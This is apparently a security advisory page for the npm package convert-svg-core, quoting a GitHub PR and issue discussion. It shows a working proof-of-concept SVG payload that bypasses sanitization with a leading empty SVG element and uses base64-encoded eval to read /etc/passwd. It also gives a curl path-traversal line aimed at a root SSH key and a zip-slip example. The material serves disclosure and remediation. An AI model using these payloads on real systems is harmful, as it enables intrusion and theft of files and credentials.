### @neocotic **[neocotic](/neocotic)** commented [Jun 7, 2022](#issue-1262985282)

If the input to be converted contains multiple SVG elements, only the first SVG element should be converted. Currently, and undesirably, all SVG elements were being inserted into the page within Puppeteer, resulting in them all being stacked prior to the screenshot being taken.

Another symptom of this was that all recent safety measures implemented for remote code injection vulnerabilities can be easily circumvented by inserting a simple empty SVG element at the start of the input as it was the only one being sanitized.

This PR fixes [#86](https://github.com/neocotic/convert-svg/issues/86).

Sorry, something went wrong.

| I found the issue from version 0.6.3. The issue is that it sanitizes svg tag only once time. so I add another svg tag which is `<svg/>` before the original payload that I used before.  ``` const { convert } = require("convert-svg-to-png"); const express = require("express");  const fileSvg = ` <svg/> <svg height=100 src=x tabindex=0 onfocus=eval(atob(this.id)) id=ZG9jdW1lbnQud3JpdGUoJzxzdmctZHVtbXk+PC9zdmctZHVtbXk+PGlmcmFtZSBzcmM9ImZpbGU6Ly8vZXRjL3Bhc3N3ZCIgd2lkdGg9IjEwMCUiIGhlaWdodD0iMTAwMHB4Ij48L2lmcmFtZT48c3ZnIHZpZXdCb3g9IjAgMCAyNDAgODAiIGhlaWdodD0iMTAwMCIgd2lkdGg9IjEwMDAiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PHRleHQgeD0iMCIgeT0iMCIgY2xhc3M9IlJycnJyIiBpZD0iZGVtbyI+ZGF0YTwvdGV4dD48L3N2Zz4nKTs= autofocus> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#1"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#2"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#3"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#1"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#2"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#3"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#1"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#2"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#3"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#1"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#2"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#3"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#1"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#2"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#3"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#1"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#2"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#3"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#1"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#2"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#3"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#1"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#2"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#3"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#1"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#2"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#3"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#1"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#2"> <svg src="https://dev.w3.org/SVG/tools/svgweb/samples/svg-files/car.svg#3"> `;  const app = express(); app.get("/poc", async (req, res) => {   try {     const png = await convert(fileSvg);     res.set("Content-Type", "image/png");     res.send(png);   } catch (e) {     res.send("");   } }); app.listen(3000, () => {   console.log("started"); });   ```  It's still vulnerable to remote code injection with directory traversal vulnerability. |

| If we use upper payload, first `cheerio.load(input, null, false)('svg');` generates some thing like this.  ``` <svg></svg><svg height="100" src="x" tabindex="0" onfocus="eval(atob(this.id))" blahblahblah> ... continues ...  ```  Then, the `svg.attr()` at `[_sanitize](svg, options)` function generates empty object. I think because cheerio's attr() function checks only once for first ends of svg tag which is `<svg></svg>`.

| I'll fix this as a separate issue as it should only be converting the first SVG element. I never intended for multiple SVG elements to be converted within a single string.  I understand that this is circumventing recent protections though so will prioritize accordingly. |

| This issue should now be resolved in the latest `0.6.4` release which now only converts the *first* SVG element found in the input buffer/string.  Thanks again for your investigation and reporting of bugs like these. |

## How to fix?

Upgrade `convert-svg-core` to version 0.6.4 or higher.

## Overview

[convert-svg-core](https://www.npmjs.org/package/convert-svg-core) is a package that supports converting SVG into another format using headless Chromium.

Affected versions of this package are vulnerable to Directory Traversal due to improper sanitization of SVG tags. Exploiting this vulnerability is possible by using a specially crafted SVG file.

## Details

A Directory Traversal attack (also known as path traversal) aims to access files and directories that are stored outside the intended folder. By manipulating files with "dot-dot-slash (../)" sequences and its variations, or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system, including application source code, configuration, and other critical system files.

Directory Traversal vulnerabilities can be generally divided into two types:

* **Information Disclosure**: Allows the attacker to gain information about the folder structure or read the contents of sensitive files on the system.

`st` is a module for serving static files on web pages, and contains a [vulnerability of this type](https://snyk.io/vuln/npm%3Ast%3A20140206). In our example, we will serve files from the `public` route.

If an attacker requests the following URL from our server, it will in turn leak the sensitive private key of the root user.

```
curl http://localhost:8080/public/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa

```

**Note** `%2e` is the URL encoded version of `.` (dot).

* **Writing arbitrary files**: Allows the attacker to create or replace existing files. This type of vulnerability is also known as `Zip-Slip`.

One way to achieve this is by using a malicious `zip` archive that holds path traversal filenames. When each filename in the zip archive gets concatenated to the target extraction folder, without validation, the final path ends up outside of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.

The following is an example of a `zip` archive with one benign file and one malicious file. Extracting the malicious file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:

```
2018-04-15 22:04:29 .....           19           19  good.txt
2018-04-15 22:04:42 .....           20           20  ../../../../../../root/.ssh/authorized_keys

```

### CVSS Scores

version 3.1
### Snyk

7.5 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is a total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact. For example, an attacker steals the administrator's password, or private encryption keys of a web server.

  **High**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is no impact to availability within the impacted component.

  **None**
